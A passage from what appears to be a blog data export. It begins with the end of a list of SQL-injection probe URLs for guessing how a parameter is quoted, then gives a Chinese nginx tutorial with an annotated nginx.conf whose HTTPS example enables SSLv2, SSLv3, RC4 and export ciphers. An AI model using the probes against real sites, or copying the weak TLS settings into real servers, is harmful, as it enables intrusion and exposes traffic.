猜测为’ ‘\n?id=1%27)%26%26(%271=1 猜测为（’ ‘）\n?id=1%22%26%26%221=1 猜测为 &quot; &quot;\n?id=1%22)%26%26(%221=1 猜测为(&quot; &quot;)\n?id=1)%26%26(1=1  猜测为()\n?id=1%26%261=1 无\n</code></pre></li>\n</ul>"},{"title":"nginx 实际使用","date":"2019-07-18T21:45:32.000Z","_content":"\n# 一.nginx使用场景\n\n- 负载均衡\n\n```\nupstream test {\n    server localhost:8080 weight=9;\n    server localhost:8081 weight=1;\n}\n```\nRR（默认，按时间顺序分配）<br>\n\n权重<br>\n\nip_hash<br>\n\n- 正向代理\n\n访问一些访问不到的资源<br>\n同时可以隐藏自己<br>\n\n\n```\nresolver 114.114.114.114 8.8.8.8;\nserver {\n    resolver_timeout 5s;\n\n    listen 81;\n    access_log  e:/wwwrootproxy.access.log;\n    error_log   e:/wwwrootproxy.error.log;\n\n    location / {\n        proxy_pass http://$host$request_uri;\n    }\n}\n```\n\n- 反向代理\n\n让资源能被别人访问到<br>\n同时可以保护内网安全<br>\n\n```\nserver {\n    listen 8080;\n    server_name localhost;\n    location /tomcat1/ {\n            proxy_pass http://67.216.XX.xx:8002/test/;\n\n    }\n    location /tomcat2/ {\n            proxy_pass http://67.216.xx.xx:8012/test/;\n    }\n}\n```\n\n- 资源服务器\n\nnginx可以作为静态资源服务器，实现动静分离.<br>\n```\nhttp {\n    sendfile on;\n    tcp_nopush on;\n    tcp_nodelay on;\n    keepalive_timeout 65;\n    types_hash_max_size 2048;\n\n    server {\n         listen       8000;\n         server_name  localhost;\n         location / {\n             root   html;\n             index  index.html index.htm;\n         }\n         //访问地址\n         location /file/ {\n            //文件路径\n             alias   /home/xiong/file/;\n             autoindex on;\n         }\n     }\n\n}\n\n```\n\n# 二. nginx配置文件\n\n<details>\n<summary>\nnginx.conf\n</summary>\n资源地址: https://blog.csdn.net/li_adou/article/details/78178478\n\n```\n######Nginx配置文件nginx.conf中文详解#####\n\n#定义Nginx运行的用户和用户组\nuser www www;\n\n#nginx进程数，建议设置为等于CPU总核心数。\nworker_processes 8;\n\n#全局错误日志定义路径与类型，[ debug | info | notice | warn | error | crit ]\nerror_log /usr/local/nginx/logs/error.log info;\n\n#进程pid文件\npid /usr/local/nginx/logs/nginx.pid;\n\n#指定进程可以打开的最大描述符：数目\n#工作模式与连接数上限\n#这个指令是指当一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（ulimit -n）与nginx进程数相除，但是nginx分配请求并不是那么均匀，所以最好与ulimit -n 的值保持一致。\n#现在在linux 2.6内核下开启文件打开数为65535，worker_rlimit_nofile就相应应该填写65535。\n#这是因为nginx调度时分配请求到进程并不是那么的均衡，所以假如填写10240，总并发量达到3-4万时就有进程可能超过10240了，这时会返回502错误。\nworker_rlimit_nofile 65535;\n\n\nevents\n{\n    #参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型\n    #是Linux 2.6以上版本内核中的高性能网络I/O模型，linux建议epoll，如果跑在FreeBSD上面，就用kqueue模型。\n    #补充说明：\n    #与apache相类，nginx针对不同的操作系统，有不同的事件模型\n    #A）标准事件模型\n    #Select、poll属于标准事件模型，如果当前系统不存在更有效的方法，nginx会选择select或poll\n    #B）高效事件模型\n    #Kqueue：使用于FreeBSD 4.1+, OpenBSD 2.9+, NetBSD 2.0 和 MacOS X.使用双处理器的MacOS X系统使用kqueue可能会造成内核崩溃。\n    #Epoll：使用于Linux内核2.6版本及以后的系统。\n    #/dev/poll：使用于Solaris 7 11/99+，HP/UX 11.22+ (eventport)，IRIX 6.5.15+ 和 Tru64 UNIX 5.1A+。\n    #Eventport：使用于Solaris 10。 为了防止出现内核崩溃的问题， 有必要安装安全补丁。\n    use epoll;\n\n    #单个进程最大连接数（最大连接数=连接数*进程数）\n    #根据硬件调整，和前面工作进程配合起来用，尽量大，但是别把cpu跑到100%就行。每个进程允许的最多连接数，理论上每台nginx服务器的最大连接数为。\n    worker_connections 65535;\n\n    #keepalive超时时间。\n    keepalive_timeout 60;\n\n    #客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求头的大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。\n    #分页大小可以用命令getconf PAGESIZE 取得。\n    #[root@web001 ~]# getconf PAGESIZE\n    #4096\n    #但也有client_header_buffer_size超过4k的情况，但是client_header_buffer_size该值必须设置为“系统分页大小”的整倍数。\n    client_header_buffer_size 4k;\n\n    #这个将为打开文件指定缓存，默认是没有启用的，max指定缓存数量，建议和打开文件数一致，inactive是指经过多长时间文件没被请求后删除缓存。\n    open_file_cache max=65535 inactive=60s;\n\n    #这个是指多长时间检查一次缓存的有效信息。\n    #语法:open_file_cache_valid time 默认值:open_file_cache_valid 60 使用字段:http, server, location 这个指令指定了何时需要检查open_file_cache中缓存项目的有效信息.\n    open_file_cache_valid 80s;\n\n    #open_file_cache指令中的inactive参数时间内文件的最少使用次数，如果超过这个数字，文件描述符一直是在缓存中打开的，如上例，如果有一个文件在inactive时间内一次没被使用，它将被移除。\n    #语法:open_file_cache_min_uses number 默认值:open_file_cache_min_uses 1 使用字段:http, server, location  这个指令指定了在open_file_cache指令无效的参数中一定的时间范围内可以使用的最小文件数,如果使用更大的值,文件描述符在cache中总是打开状态.\n    open_file_cache_min_uses 1;\n\n    #语法:open_file_cache_errors on | off 默认值:open_file_cache_errors off 使用字段:http, server, location 这个指令指定是否在搜索一个文件是记录cache错误.\n    open_file_cache_errors on;\n}\n\n\n\n#设定http服务器，利用它的反向代理功能提供负载均衡支持\nhttp\n{\n    #文件扩展名与文件类型映射表\n    include mime.types;\n\n    #默认文件类型\n    default_type application/octet-stream;\n\n    #默认编码\n    #charset utf-8;\n\n    #服务器名字的hash表大小\n    #保存服务器名字的hash表是由指令server_names_hash_max_size 和server_names_hash_bucket_size所控制的。参数hash bucket size总是等于hash表的大小，并且是一路处理器缓存大小的倍数。在减少了在内存中的存取次数后，使在处理器中加速查找hash表键值成为可能。如果hash bucket size等于一路处理器缓存的大小，那么在查找键的时候，最坏的情况下在内存中查找的次数为2。第一次是确定存储单元的地址，第二次是在存储单元中查找键 值。因此，如果Nginx给出需要增大hash max size 或 hash bucket size的提示，那么首要的是增大前一个参数的大小.\n    server_names_hash_bucket_size 128;\n\n    #客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求的头部大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。分页大小可以用命令getconf PAGESIZE取得。\n    client_header_buffer_size 32k;\n\n    #客户请求头缓冲大小。nginx默认会用client_header_buffer_size这个buffer来读取header值，如果header过大，它会使用large_client_header_buffers来读取。\n    large_client_header_buffers 4 64k;\n\n    #设定通过nginx上传文件的大小\n    client_max_body_size 8m;\n\n    #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。\n    #sendfile指令指定 nginx 是否调用sendfile 函数（zero copy 方式）来输出文件，对于普通应用，必须设为on。如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络IO处理速度，降低系统uptime。\n    sendfile on;\n\n    #开启目录列表访问，合适下载服务器，默认关闭。\n    autoindex on;\n\n    #此选项允许或禁止使用socke的TCP_CORK的选项，此选项仅在使用sendfile的时候使用\n    tcp_nopush on;\n\n    tcp_nodelay on;\n\n    #长连接超时时间，单位是秒\n    keepalive_timeout 120;\n\n    #FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。下面参数看字面意思都能理解。\n    fastcgi_connect_timeout 300;\n    fastcgi_send_timeout 300;\n    fastcgi_read_timeout 300;\n    fastcgi_buffer_size 64k;\n    fastcgi_buffers 4 64k;\n    fastcgi_busy_buffers_size 128k;\n    fastcgi_temp_file_write_size 128k;\n\n    #gzip模块设置\n    gzip on; #开启gzip压缩输出\n    gzip_min_length 1k;    #最小压缩文件大小\n    gzip_buffers 4 16k;    #压缩缓冲区\n    gzip_http_version 1.0;    #压缩版本（默认1.1，前端如果是squid2.5请使用1.0）\n    gzip_comp_level 2;    #压缩等级\n    gzip_types text/plain application/x-javascript text/css application/xml;    #压缩类型，默认就已经包含textml，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。\n    gzip_vary on;\n\n    #开启限制IP连接数的时候需要使用\n    #limit_zone crawler $binary_remote_addr 10m;\n\n\n\n    #负载均衡配置\n    upstream piao.jd.com {\n\n        #upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。\n        server 192.168.80.121:80 weight=3;\n        server 192.168.80.122:80 weight=2;\n        server 192.168.80.123:80 weight=3;\n\n        #nginx的upstream目前支持4种方式的分配\n        #1、轮询（默认）\n        #每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。\n        #2、weight\n        #指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。\n        #例如：\n        #upstream bakend {\n        #    server 192.168.0.14 weight=10;\n        #    server 192.168.0.15 weight=10;\n        #}\n        #2、ip_hash\n        #每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。\n        #例如：\n        #upstream bakend {\n        #    ip_hash;\n        #    server 192.168.0.14:88;\n        #    server 192.168.0.15:80;\n        #}\n        #3、fair（第三方）\n        #按后端服务器的响应时间来分配请求，响应时间短的优先分配。\n        #upstream backend {\n        #    server server1;\n        #    server server2;\n        #    fair;\n        #}\n        #4、url_hash（第三方）\n        #按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。\n        #例：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法\n        #upstream backend {\n        #    server squid1:3128;\n        #    server squid2:3128;\n        #    hash $request_uri;\n        #    hash_method crc32;\n        #}\n\n        #tips:\n        #upstream bakend{#定义负载均衡设备的Ip及设备状态}{\n        #    ip_hash;\n        #    server 127.0.0.1:9090 down;\n        #    server 127.0.0.1:8080 weight=2;\n        #    server 127.0.0.1:6060;\n        #    server 127.0.0.1:7070 backup;\n        #}\n        #在需要使用负载均衡的server中增加 proxy_pass http://bakend/;\n\n        #每个设备的状态设置为:\n        #1.down表示单前的server暂时不参与负载\n        #2.weight为weight越大，负载的权重就越大。\n        #3.max_fails：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream模块定义的错误\n        #4.fail_timeout:max_fails次失败后，暂停的时间。\n        #5.backup： 其它所有的非backup机器down或者忙的时候，请求backup机器。所以这台机器压力会最轻。\n\n        #nginx支持同时设置多组的负载均衡，用来给不用的server来使用。\n        #client_body_in_file_only设置为On 可以讲client post过来的数据记录到文件中用来做debug\n        #client_body_temp_path设置记录文件的目录 可以设置最多3层目录\n        #location对URL进行匹配.可以进行重定向或者进行新的代理 负载均衡\n    }\n\n\n\n    #虚拟主机的配置\n    server\n    {\n        #监听端口\n        listen 80;\n\n        #域名可以有多个，用空格隔开\n        server_name www.jd.com jd.com;\n        index index.html index.htm index.php;\n        root /data/www/jd;\n\n        #对******进行负载均衡\n        location ~ .*.(php|php5)?$\n        {\n            fastcgi_pass 127.0.0.1:9000;\n            fastcgi_index index.php;\n            include fastcgi.conf;\n        }\n\n        #图片缓存时间设置\n        location ~ .*.(gif|jpg|jpeg|png|bmp|swf)$\n        {\n            expires 10d;\n        }\n\n        #JS和CSS缓存时间设置\n        location ~ .*.(js|css)?$\n        {\n            expires 1h;\n        }\n\n        #日志格式设定\n        #$remote_addr与$http_x_forwarded_for用以记录客户端的ip地址；\n        #$remote_user：用来记录客户端用户名称；\n        #$time_local： 用来记录访问时间与时区；\n        #$request： 用来记录请求的url与http协议；\n        #$status： 用来记录请求状态；成功是200，\n        #$body_bytes_sent ：记录发送给客户端文件主体内容大小；\n        #$http_referer：用来记录从那个页面链接访问过来的；\n        #$http_user_agent：记录客户浏览器的相关信息；\n        #通常web服务器放在反向代理的后面，这样就不能获取到客户的IP地址了，通过$remote_add拿到的IP地址是反向代理服务器的iP地址。反向代理服务器在转发请求的http头信息中，可以增加x_forwarded_for信息，用以记录原有客户端的IP地址和原来客户端的请求的服务器地址。\n        log_format access '$remote_addr - $remote_user [$time_local] \"$request\" '\n        '$status $body_bytes_sent \"$http_referer\" '\n        '\"$http_user_agent\" $http_x_forwarded_for';\n\n        #定义本虚拟主机的访问日志\n        access_log  /usr/local/nginx/logs/host.access.log  main;\n        access_log  /usr/local/nginx/logs/host.access.404.log  log404;\n\n        #对 \"/\" 启用反向代理\n        location / {\n            proxy_pass http://127.0.0.1:88;\n            proxy_redirect off;\n            proxy_set_header X-Real-IP $remote_addr;\n\n            #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n\n            #以下是一些反向代理的配置，可选。\n            proxy_set_header Host $host;\n\n            #允许客户端请求的最大单文件字节数\n            client_max_body_size 10m;\n\n            #缓冲区代理缓冲用户端请求的最大字节数，\n            #如果把它设置为比较大的数值，例如256k，那么，无论使用firefox还是IE浏览器，来提交任意小于256k的图片，都很正常。如果注释该指令，使用默认的client_body_buffer_size设置，也就是操作系统页面大小的两倍，8k或者16k，问题就出现了。\n            #无论使用firefox4.0还是IE8.0，提交一个比较大，200k左右的图片，都返回500 Internal Server Error错误\n            client_body_buffer_size 128k;\n\n            #表示使nginx阻止HTTP应答代码为400或者更高的应答。\n            proxy_intercept_errors on;\n\n            #后端服务器连接的超时时间_发起握手等候响应超时时间\n            #nginx跟后端服务器连接超时时间(代理连接超时)\n            proxy_connect_timeout 90;\n\n            #后端服务器数据回传时间(代理发送超时)\n            #后端服务器数据回传时间_就是在规定时间之内后端服务器必须传完所有的数据\n            proxy_send_timeout 90;\n\n            #连接成功后，后端服务器响应时间(代理接收超时)\n            #连接成功后_等候后端服务器响应时间_其实已经进入后端的排队之中等候处理（也可以说是后端服务器处理请求的时间）\n            proxy_read_timeout 90;\n\n            #设置代理服务器（nginx）保存用户头信息的缓冲区大小\n            #设置从被代理服务器读取的第一部分应答的缓冲区大小，通常情况下这部分应答中包含一个小的应答头，默认情况下这个值的大小为指令proxy_buffers中指定的一个缓冲区的大小，不过可以将其设置为更小\n            proxy_buffer_size 4k;\n\n            #proxy_buffers缓冲区，网页平均在32k以下的设置\n            #设置用于读取应答（来自被代理服务器）的缓冲区数目和大小，默认情况也为分页大小，根据操作系统的不同可能是4k或者8k\n            proxy_buffers 4 32k;\n\n            #高负荷下缓冲大小（proxy_buffers*2）\n            proxy_busy_buffers_size 64k;\n\n            #设置在写入proxy_temp_path时数据的大小，预防一个工作进程在传递文件时阻塞太长\n            #设定缓存文件夹大小，大于这个值，将从upstream服务器传\n            proxy_temp_file_write_size 64k;\n        }\n\n\n        #设定查看Nginx状态的地址\n        location /NginxStatus {\n            stub_status on;\n            access_log on;\n            auth_basic \"NginxStatus\";\n            auth_basic_user_file confpasswd;\n            #htpasswd文件的内容可以用apache提供的htpasswd工具来产生。\n        }\n\n        #本地动静分离反向代理配置\n        #所有jsp的页面均交由tomcat或resin处理\n        location ~ .(jsp|jspx|do)?$ {\n            proxy_set_header Host $host;\n            proxy_set_header X-Real-IP $remote_addr;\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n            proxy_pass http://127.0.0.1:8080;\n        }\n\n        #所有静态文件由nginx直接读取不经过tomcat或resin\n        location ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt|\n        pdf|xls|mp3|wma)$\n        {\n            expires 15d;\n        }\n\n        location ~ .*.(js|css)?$\n        {\n            expires 1h;\n        }\n    }\n}\n######Nginx配置文件nginx.conf中文详解#####\n```\n</details>\n\n## 1.全局块\n\n全局块是默认配置文件从开始到events块之间的一部分内容，主要设置一些影响Nginx服务器整体运行的配置指令，作用域是Nginx服务器全局。<br>\n通常包含配置运行Nginx服务器的用户（组）、允许生成的worker process数，Nginx进程PID存放路径、日志的存放路径和类型以及配置文件引入等。<br>\n\n## 2.events块\n\nevents块设计的指令主要影响Nginx服务器与用户的网络连接。常用到的设置包括是选取哪种事件驱动模型处理连接请求，每个worker process可以同时支持的最大连接数等。<br>\n这一部分的指令对Nginx服务器的性能影响较大，在实际配置中应该根据实际情况灵活调整。<br>\n\n```\nevents {\n    # epoll linux下的高效工作模型首选\n    use epoll;\n\n    #worker_connections用于定义Nginx每个进程的最大连接数\n    # 即接收前端的最大请求数\n    worker_connections  1024;\n}\n```\n\n\n## 3.http块\n\nhttp块是Nginx服务器配置中的重要部分，代理、缓存和日志定义等绝大多数的功能和第三方模块的配置都可以放在这个模块中。<br>\nhttp块中可以包含自己的全局块，也可以包含server块，server块中又进一步包含location块。<br>\n可以在http全局块中配置的指令包括文件引入、MIME-Type定义、日志自定义、是否使用sendfile传输文件、连接超时时间、单请求数上线等。\n\n\n### 3.1 http全局\n\n```\nhttp\n{\n    #文件扩展名与文件类型映射表 mime(多用途因特网邮件扩展)\n    include mime.types;\n\n    #默认文件类型\n    default_type application/octet-stream;\n\n    #默认编码\n    charset utf-8;\n\n    #设定通过nginx上传文件的大小\n    client_max_body_size 8m;\n\n    #开启高效文件传输模式\n    sendfile on;\n\n    #开启目录列表访问，合适下载服务器，默认关闭。\n    autoindex on;\n\n    #此选项允许或禁止使用socke的TCP_CORK的选项，此选项仅在使用sendfile的时候使用\n    tcp_nopush on;\n    tcp_nodelay on;\n\n    #长连接超时时间，单位是秒\n    keepalive_timeout 120;\n\n    #gzip模块设置\n    gzip on; #开启gzip压缩输出\n    gzip_min_length 1k;    #最小压缩文件大小\n    gzip_buffers 4 16k;    #压缩缓冲区\n    gzip_http_version 1.0;    #压缩版本\n    gzip_comp_level 2;    #压缩等级\n    gzip_types text/plain application/x-javascript text/css application/xml;    #压缩类型，默认就已经包含textml\n    gzip_vary on;\n\n    #开启限制IP连接数的时候需要使用\n    #limit_zone crawler $binary_remote_addr 10m;\n\n}\n```\n\n### 3.2 server\n\n每个server块就相当于一台虚拟主机，它内部可有多台主机联合提供服务，一起对外提供一组服务<br>\n\n#### 3.2.1  server全局\n\n```\nserver {\n        #监听的端口\n        listen       8080;\n\n        #用来指定IP地址或者域名，多个域名之间用空格分开， 可以通配符 *.test.com\n        server_name  localhost 192.168.12.10 www.yangyi.com;\n\n        #根目录\n        #root   /Users/yangyi/www;\n        #初始页面 自左向右匹配\n        #index  index.php index.html index.htm;\n\n        charset utf-8;\n\n        #日志路径与级别\n        access_log  usr/local/var/log/host.access.log  main;\n        aerror_log  usr/local/var/log/host.error.log  error;\n\n\n}\n```\n\n#### 3.2.2 upstream\n\n定义服务集群，用于负载均衡.<br>\n\n#### 3.2.3 location\n\nlocation块的主要作用是，基于Nginx服务器接收到的请求字符串进行匹配，对特定的请求进行处理<br>\n\n <strong> location [=|\\~|\\~\\*|^~|@] /uri/ { … } </strong>\n\n location 可分两大类：\n\n - 普通 location<br>\n\n\n 以 “ = ” 或 “ ^~ ”为前缀或者没有任何前缀的 /uri/\n\n - 正则 location\n\n以 “ ~ ” 或 “ ~* ”为前缀的 /uri/, 即以  ~ 开头的<br>\n正则的意义是，url中可以使用正则<br>\n\n\n=：表示完全匹配，不存在正则表示，如 location = /uri {.....}\n\n~：表示匹配时，大小写敏感的，如 location ~ /uri {.....} \n\n~\\*：表示匹配时，大小写不敏感，即忽略大小写问题，如 location ~* /uri {......}，这时/uri，/Uri， /URI都可以匹配上。\n\n^\\~：表示匹配时，只需开头部分匹配上即可，如 location ^~ /uri/ {....}  ，这时只要以/uri/开头的地址都会匹配上<br>\n\n<strong>location详细讲解参考 location模块.md</strong>\n\n\n# 三.其它\n\n## 1.nginx限制访问ip\n\n黑白名单\n\n```\n# 服务器全局限制\nallow 67.216.218.37;\ndeny all;\n\n# location中限制\nlocation / {\n    index index.html index.htm index.php;\n    allow 67.216.218.37;\n    deny all;\n}\n```\n\n- 注意:<br>\n\n可以使用IP段<br>\n从允许访问的段位从小到大排列,如127.0.0.0/24 下面才能是10.10.0.0/16<br>\ndeny all; 结尾 表示除了上面allow的其他都禁止<br>\n\ndeny 192.168.1.1;<br>\nallow 127.0.0.0/24;<br>\nallow 192.168.0.0/16;<br>\nallow 10.10.0.0/16;<br>\ndeny all;<br>\n\n## 2.限制下载速度\n\n限速\n\n```\nlocation /download {\n       # 10m之前不限速\n       limit_rate_after 10m;\n       limit_rate 128k;\n }  \n```\n\n## 3.限制ip访问频率\n\n防攻击\n\n- limit_req_zone\n\n这个变量只能在http使用\n```\nhttp{\n  ...\n  #定义一个名为allips的limit_req_zone用来存储session，大小是10M内存，\n  #以$binary_remote_addr 为key,限制平均每秒的请求为5个，\n  #1M能存储16000个状态，rete的值必须为整数，\n  #如果限制两秒钟一个请求，可以设置成30r/m\n\n  limit_req_zone $binary_remote_addr zone=allips:10m rate=5r/s;\n  ...\n\n```\n\n- limit_req\n\n```\n...\n  server{\n    ...\n    location {\n      ...\n      #限制每ip每秒不超过20个请求，漏桶数burst为5\n      #brust的意思就是，如果第1秒、2,3,4秒请求为19个，\n      #第5秒的请求为25个是被允许的。\n      #但是如果你第1秒就25个请求，第2秒超过20的请求返回503错误。\n      #nodelay，如果不设置该选项，严格使用平均速率限制请求数，\n      #第1秒25个请求时，5个请求放到第2秒执行，\n      #设置nodelay，25个请求将在第1秒执行。\n\n      limit_req zone=allips burst=5 nodelay;\n      ...\n    }\n    ...\n  }\n  ...\n```\n\n## 4.https代理\n\n配置 SSL 将 http 代理到 https\n\n```\n#原80端口做301转跳\nserver {\n    listen 80;\n    server_name w3cschool.cn www.w3cschool.cn;\n    return 301 https://www.zhimiyun.com$request_uri;    #跳转到Https\n}\n#配置ssl证书和开启ssl功能\nserver {\n    listen       443;\n    server_name  www.w3cschool.cn;\n    root   wwwroot;\n    index  index.html index.htm;\n\n    ssl                  on;\n    ssl_certificate      /usr/ssl/ca.pem; #证书地址\n    ssl_certificate_key  /usr/ssl/ca.key;\n\n    ssl_session_timeout  5m;\n\n    ssl_protocols  SSLv2 SSLv3 TLSv1 TLSv1.1 TLSv1.2;\n    ssl_ciphers  ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP;\n    ssl_prefer_server_ciphers   on;\n    error_page 497 \"https://$host$uri?$args\"; #这是跳转Http请求到Https\n\n    location / {\n        ...\n    }\n}\n```\n\n## 5.静态资源缓存\n\n对于站点中不经常修改的静态内容（如图片，JS，CSS），可以设置静态资源缓存，控制浏览器缓存，达到有效减小带宽流量，降低服务器压力。\n\n```\nlocation ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ {\n#过期时间为30天，\n#图片文件不怎么更新，过期可以设大一点，\n#如果频繁更新，则可以设置得小一点。\nexpires 30d;\n}\n\nlocation ~ .*\\.(js|css)$ {\nexpires 10d;\n}\n```\n","source":"_posts/tools/nginx/nginx实际问题.md","raw":"---\ntitle: nginx 实际使用\ndate: 2019-07-18 17:45:32\ntags: [tools]\n---\n\n# 一.nginx使用场景\n\n- 负载均衡\n\n```\nupstream test {\n    server localhost:8080 weight=9;\n    server localhost:8081 weight=1;\n}\n```\nRR（默认，按时间顺序分配）<br>\n\n权重<br>\n\nip_hash<br>\n\n- 正向代理\n\n访问一些访问不到的资源<br>\n同时可以隐藏自己<br>\n\n\n```\nresolver 114.114.114.114 8.8.8.8;\nserver {\n    resolver_timeout 5s;\n\n    listen 81;\n    access_log  e:/wwwrootproxy.access.log;\n    error_log   e:/wwwrootproxy.error.log;\n\n    location / {\n        proxy_pass http://$host$request_uri;\n    }\n}\n```\n\n- 反向代理\n\n让资源能被别人访问到<br>\n同时可以保护内网安全<br>\n\n```\nserver {\n    listen 8080;\n    server_name localhost;\n    location /tomcat1/ {\n            proxy_pass http://67.216.XX.xx:8002/test/;\n\n    }\n    location /tomcat2/ {\n            proxy_pass http://67.216.xx.xx:8012/test/;\n    }\n}\n```\n\n- 资源服务器\n\nnginx可以作为静态资源服务器，实现动静分离.<br>\n```\nhttp {\n    sendfile on;\n    tcp_nopush on;\n    tcp_nodelay on;\n    keepalive_timeout 65;\n    types_hash_max_size 2048;\n\n    server {\n         listen       8000;\n         server_name  localhost;\n         location / {\n             root   html;\n             index  index.html index.htm;\n         }\n         //访问地址\n         location /file/ {\n            //文件路径\n             alias   /home/xiong/file/;\n             autoindex on;\n         }\n     }\n\n}\n\n```\n\n# 二. nginx配置文件\n\n<details>\n<summary>\nnginx.conf\n</summary>\n资源地址: https://blog.csdn.net/li_adou/article/details/78178478\n\n```\n######Nginx配置文件nginx.conf中文详解#####\n\n#定义Nginx运行的用户和用户组\nuser www www;\n\n#nginx进程数，建议设置为等于CPU总核心数。\nworker_processes 8;\n\n#全局错误日志定义路径与类型，[ debug | info | notice | warn | error | crit ]\nerror_log /usr/local/nginx/logs/error.log info;\n\n#进程pid文件\npid /usr/local/nginx/logs/nginx.pid;\n\n#指定进程可以打开的最大描述符：数目\n#工作模式与连接数上限\n#这个指令是指当一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（ulimit -n）与nginx进程数相除，但是nginx分配请求并不是那么均匀，所以最好与ulimit -n 的值保持一致。\n#现在在linux 2.6内核下开启文件打开数为65535，worker_rlimit_nofile就相应应该填写65535。\n#这是因为nginx调度时分配请求到进程并不是那么的均衡，所以假如填写10240，总并发量达到3-4万时就有进程可能超过10240了，这时会返回502错误。\nworker_rlimit_nofile 65535;\n\n\nevents\n{\n    #参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型\n    #是Linux 2.6以上版本内核中的高性能网络I/O模型，linux建议epoll，如果跑在FreeBSD上面，就用kqueue模型。\n    #补充说明：\n    #与apache相类，nginx针对不同的操作系统，有不同的事件模型\n    #A）标准事件模型\n    #Select、poll属于标准事件模型，如果当前系统不存在更有效的方法，nginx会选择select或poll\n    #B）高效事件模型\n    #Kqueue：使用于FreeBSD 4.1+, OpenBSD 2.9+, NetBSD 2.0 和 MacOS X.使用双处理器的MacOS X系统使用kqueue可能会造成内核崩溃。\n    #Epoll：使用于Linux内核2.6版本及以后的系统。\n    #/dev/poll：使用于Solaris 7 11/99+，HP/UX 11.22+ (eventport)，IRIX 6.5.15+ 和 Tru64 UNIX 5.1A+。\n    #Eventport：使用于Solaris 10。 为了防止出现内核崩溃的问题， 有必要安装安全补丁。\n    use epoll;\n\n    #单个进程最大连接数（最大连接数=连接数*进程数）\n    #根据硬件调整，和前面工作进程配合起来用，尽量大，但是别把cpu跑到100%就行。每个进程允许的最多连接数，理论上每台nginx服务器的最大连接数为。\n    worker_connections 65535;\n\n    #keepalive超时时间。\n    keepalive_timeout 60;\n\n    #客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求头的大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。\n    #分页大小可以用命令getconf PAGESIZE 取得。\n    #[root@web001 ~]# getconf PAGESIZE\n    #4096\n    #但也有client_header_buffer_size超过4k的情况，但是client_header_buffer_size该值必须设置为“系统分页大小”的整倍数。\n    client_header_buffer_size 4k;\n\n    #这个将为打开文件指定缓存，默认是没有启用的，max指定缓存数量，建议和打开文件数一致，inactive是指经过多长时间文件没被请求后删除缓存。\n    open_file_cache max=65535 inactive=60s;\n\n    #这个是指多长时间检查一次缓存的有效信息。\n    #语法:open_file_cache_valid time 默认值:open_file_cache_valid 60 使用字段:http, server, location 这个指令指定了何时需要检查open_file_cache中缓存项目的有效信息.\n    open_file_cache_valid 80s;\n\n    #open_file_cache指令中的inactive参数时间内文件的最少使用次数，如果超过这个数字，文件描述符一直是在缓存中打开的，如上例，如果有一个文件在inactive时间内一次没被使用，它将被移除。\n    #语法:open_file_cache_min_uses number 默认值:open_file_cache_min_uses 1 使用字段:http, server, location  这个指令指定了在open_file_cache指令无效的参数中一定的时间范围内可以使用的最小文件数,如果使用更大的值,文件描述符在cache中总是打开状态.\n    open_file_cache_min_uses 1;\n\n    #语法:open_file_cache_errors on | off 默认值:open_file_cache_errors off 使用字段:http, server, location 这个指令指定是否在搜索一个文件是记录cache错误.\n    open_file_cache_errors on;\n}\n\n\n\n#设定http服务器，利用它的反向代理功能提供负载均衡支持\nhttp\n{\n    #文件扩展名与文件类型映射表\n    include mime.types;\n\n    #默认文件类型\n    default_type application/octet-stream;\n\n    #默认编码\n    #charset utf-8;\n\n    #服务器名字的hash表大小\n    #保存服务器名字的hash表是由指令server_names_hash_max_size 和server_names_hash_bucket_size所控制的。参数hash bucket size总是等于hash表的大小，并且是一路处理器缓存大小的倍数。在减少了在内存中的存取次数后，使在处理器中加速查找hash表键值成为可能。如果hash bucket size等于一路处理器缓存的大小，那么在查找键的时候，最坏的情况下在内存中查找的次数为2。第一次是确定存储单元的地址，第二次是在存储单元中查找键 值。因此，如果Nginx给出需要增大hash max size 或 hash bucket size的提示，那么首要的是增大前一个参数的大小.\n    server_names_hash_bucket_size 128;\n\n    #客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求的头部大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。分页大小可以用命令getconf PAGESIZE取得。\n    client_header_buffer_size 32k;\n\n    #客户请求头缓冲大小。nginx默认会用client_header_buffer_size这个buffer来读取header值，如果header过大，它会使用large_client_header_buffers来读取。\n    large_client_header_buffers 4 64k;\n\n    #设定通过nginx上传文件的大小\n    client_max_body_size 8m;\n\n    #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 